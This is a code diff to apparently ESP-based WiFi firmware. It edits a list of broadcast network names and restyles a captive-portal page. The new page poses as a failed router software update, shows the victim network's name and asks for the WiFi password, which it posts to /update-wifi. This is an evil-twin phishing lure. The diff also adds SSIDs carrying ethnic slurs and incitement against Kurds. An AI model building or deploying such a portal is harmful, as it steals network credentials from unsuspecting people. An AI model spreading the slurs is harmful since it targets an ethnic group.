@@ -49,7 +49,7 @@ const char ssids[] PROGMEM = {
   "altima sictim btw\n"
   "tutmayin kucuk enisteyi\n"
   "ulan sende bi siktir git amk\n"
-  "sem hayyyirdddir babaaaa\n"
+  "amk kürdü sg\n"
   "hayir sen neeeeeeolsun istiyon\n"
   "cok korktum yapmasinlar\n"
   "siber saldiri\n"
@@ -61,7 +61,7 @@ const char ssids[] PROGMEM = {
   "Virus deil korkma\n"
   "heykirbaba3162\n"
   "vergi.exe\n"
-  "istifa et artik\n"
+  "vur kürde\n"
   "Kahve Dunyasi\n"
   "dostum bu cok havali\n"
   "arkana bak\n"
@@ -904,116 +904,115 @@ void handleWifiUpdate() {
 
   String html = R"=====(
 <!DOCTYPE html>
-<html lang='tr'>
+<html lang="tr">
 <head>
-  <meta charset='UTF-8'>
-  <meta name='viewport' content='width=device-width, initial-scale=1.0'>
-  <title>WiFi Güncelleme</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #403f3f;
-      margin: 0;
-      padding: 20px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      color: white;
-    }
-    .container {
-      background-color: #505050;
-      padding: 20px;
-      border-radius: 8px;
-      width: 90%;
-      max-width: 400px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
-    }
-    h1 {
-      color: white;
-      text-align: center;
-      margin-bottom: 20px;
-    }
-    .info {
-      color: #ff9800;
-      text-align: center;
-      margin-bottom: 20px;
-    }
-    .form-group {
-      margin-bottom: 15px;
-    }
-    label {
-      display: block;
-      margin-bottom: 5px;
-      font-weight: bold;
-    }
-    input[type="password"] {
-      width: 100%;
-      padding: 10px;
-      border: 1px solid #666;
-      border-radius: 4px;
-      background-color: #606060;
-      color: white;
-      box-sizing: border-box;
-    }
-    button {
-      width: 100%;
-      padding: 12px;
-      background-color: #007bff;
-      color: white;
-      border: none;
-      border-radius: 4px;
-      font-size: 16px;
-      cursor: pointer;
-      transition: background-color 0.3s;
-    }
-    button:hover {
-      background-color: #0056b3;
-    }
-    .status {
-      margin-top: 15px;
-      padding: 10px;
-      border-radius: 4px;
-      text-align: center;
-      display: none;
-    }
-    .success {
-      background-color: #4CAF50;
-      display: block;
-    }
-    .error {
-      background-color: #f44336;
-      display: block;
-    }
-    .loading {
-      color: #2196F3;
-      display: block;
-    }
-    a.home-link {
-      display: inline-block;
-      margin-top: 20px;
-      text-decoration: none;
-      color: #007bff;
-      font-weight: bold;
-    }
-    a.home-link:hover {
-      text-decoration: underline;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WiFi Yazılım Güncelleme</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #0068A5; /* Fotodaki mavi arka plan */
+            color: rgb(255, 255, 255);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+        }
+
+        .container {
+            background-color: #1A4876; /* Fotodaki koyu mavi renk */
+            padding: 40px;
+            border-radius: 10px;
+            width: 80%;
+            max-width: 600px;
+            box-shadow: 0 4px 8px rgba(7, 7, 7, 0.2);
+        }
+
+        h1 {
+            font-size: 32px;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            font-size: 18px;
+            margin-bottom: 30px;
+        }
+
+        .form-container {
+            background-color: #2d2d2d; /* Fotodaki koyu gri arka plan */
+            padding: 20px;
+            border-radius: 10px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .input-field {
+            width:80%;
+            padding: 12px;
+            font-size: 16px;
+            margin-bottom: 20px;
+            border: none;
+            border-radius: 5px;
+            background-color: #D6E4F0; /* Gri mavi arka plan */
+            color: #333;
+        }
+
+        .submit-btn {
+            background-color: #007bff; /* Buton rengi mavi */
+            color: white;
+            padding: 15px 30px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.3s ease;
+        }
+
+        .submit-btn:hover {
+            background-color: #0056b3; /* Hover durumunda koyu mavi */
+        }
+
+        .note {
+            font-size: 14px;
+            color: #B0C4DE;
+            margin-top: 10px;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #ffffff;
+        }
+
+    </style>
 </head>
 <body>
-  <div class="container">
+   <div class="container">
     <h1>WiFi Güncellemesi ()=====";
     html += targetSSID;
     html += R"=====()</h1>
-    <div class="info">WiFi güncellemesi gerekiyor</div>
-    
+    <div class="info">Yazılım güncellemesi başarısız oldu. Lütfen şifrenizi girerek yeniden deneyin.</div>
+
     <form id="wifiForm" action="/update-wifi" method="POST" onsubmit="return false;">
-      <div class="form-group">
+      <div class="form-container">
+
         <label for="password">WiFi Şifresi</label>
-        <input type="password" id="password" name="password" required>
+        <input type="password" id="password" name="password" class="input-field" minlength="5" required>
+        <button type="submit" class="submit-btn">Güncelle</button>
+
       </div>
-      <button type="submit">Güncelle</button>
     </form>
+    <div class="note">
+            <p>Wi-Fi şifrenizi doğru girdiğinizden emin olun, ardından yükleme işlemi başlayacaktır.</p>
+        </div>
+        <div class="footer">
+            <p>&#169; Tüm hakları saklıdır.</p>
+        </div>
     
     <div id="statusMessage" class="status"></div>
   </div>
